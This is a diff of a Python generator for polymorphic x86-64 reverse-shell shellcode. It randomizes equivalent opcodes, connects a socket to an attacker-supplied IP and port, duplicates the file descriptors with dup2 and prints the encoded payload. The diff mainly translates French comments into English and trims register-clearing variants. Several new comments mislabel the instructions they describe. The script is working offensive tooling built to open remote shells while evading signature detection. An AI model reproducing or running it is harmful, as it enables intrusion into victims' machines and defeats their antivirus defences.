@@ -77,22 +77,22 @@ def offus(string4Payload, rand):
 
 def clean(reg):
     if str(reg) == "rax":
-        l = ["4831c0", "4829c0", "48c1e810"]
-        return l[r(0,2)]
+        l = ["4831c0", "4829c0"] # xor rax, rax or sub rax, rax 
+        return l[r(0,1)]
     elif str(reg) == "rbx":
-        l = ["4831db","4829db", "48c1eb10"]
-        return l[r(0,2)]
+        l = ["4831db","4829db"] # xor rax, rax or sub rax, rax 
+        return l[r(0,1)]
     elif str(reg) == "rcx":
-        l = ["4831c9","4829c9", "48c1e910"]
-        return l[r(0,2)]
+        l = ["4831c9","4829c9"] # xor rax, rax or sub rax, rax 
+        return l[r(0,1)]
     elif str(reg) == "rdx":
-        l = ["4831d2","4829d2", "48c1ea10"]
-        return l[r(0,2)]
+        l = ["4831d2","4829d2"] # xor rax, rax or sub rax, rax 
+        return l[r(0,1)]
     elif str(reg) == "rsi":
-        l = ["4831f6", "48c1ee10"]
+        l = ["4831f6", "48c1ee10"] # xor rax, rax or sub rax, rax 
         return l[r(0,1)]
     elif str(reg) == "rdi":
-        l = ["4831ff","48c1ef10"]
+        l = ["4831ff","48c1ef10"] # xor rax, rax or sub rax, rax 
         return l[r(0,1)]
 
 
@@ -100,7 +100,7 @@ def clean(reg):
 
 def create_socket():
     global PAYLOAD
-    # On set rax à 41 (le premier cas correspond à "add rax,41" le deuxième à "mov rax, 0x29")
+    # syscall
     PAYLOAD += "b029" if r(0,1) else "0429"
     # On set rbx à 2 pour ensuite le copier dans rdi (le premier cas correspond à "mov bl, 0x02; mov rdi, rbx" le deuxième à "add bl, 0x02, mov rdi, rbx" le troisième correspond à un "inc rdi, inc rdi")
     rand = r(0,2)
@@ -111,7 +111,7 @@ def create_socket():
     elif rand == 2:
         PAYLOAD += "48ffc748ffc7"
     clean("rbx")
-    # On set rbx à 1 pour ensuite le copier dans rsi (le premier cas correspond à "mov bl, 0x01; mov rsi, rbx" le deuxième à "add bl, 0x01, mov rsi, rbx" le troisième correspond à "inc rsi")
+    # set rbx to 1 then copied it on rsi ("mov bl, 0x01; mov rsi, rbx" "add bl, 0x01, mov rsi, rbx" "inc rsi")
     rand = r(0,2)
     if rand == 0:
         PAYLOAD += "b3014889de"
@@ -153,13 +153,12 @@ def socket_connect(ip, port):
     port = hex(socket.htons(int(port)))[2:]
 
     PAYLOAD += "566668" # push
-    PAYLOAD += port[2:] + port[:2] # Le port en little endian    
+    PAYLOAD += port[2:] + port[:2] # little endian    
     PAYLOAD += "666A02" #AF_INET
-    PAYLOAD += "4889E6" if r(0,1) else "4831F64801E6" # soit on fait "mov rsi, rsp" soit on fait "xor rsi, rsi ; add rsi, rsp"
+    PAYLOAD += "4889E6" if r(0,1) else "4831F64801E6" # "mov rsi, rsp" "xor rsi, rsi ; add rsi, rsp"
     PAYLOAD += "B218" # mov dl,24
     PAYLOAD += call()
     return PAYLOAD
-
 
 def dup2x3():
     global PAYLOAD
@@ -220,7 +219,6 @@ PAYLOAD += clean("rcx")
 PAYLOAD += clean("rdx")
 PAYLOAD += clean("rdi")
 PAYLOAD += clean("rsi")
-PAYLOAD += clean("rbx")
 PAYLOAD += clean("rsi")
 create_socket()
 socket_connect(argv[1], argv[2])
@@ -228,7 +226,6 @@ dup2x3()
 #factorOffus("0x68732f0069622f2f")
 #print(PAYLOAD)
 _exit()
-
 #print(bit_to_opcode(PAYLOAD))
 #print(PAYLOAD)
 print(shellcodize(PAYLOAD))
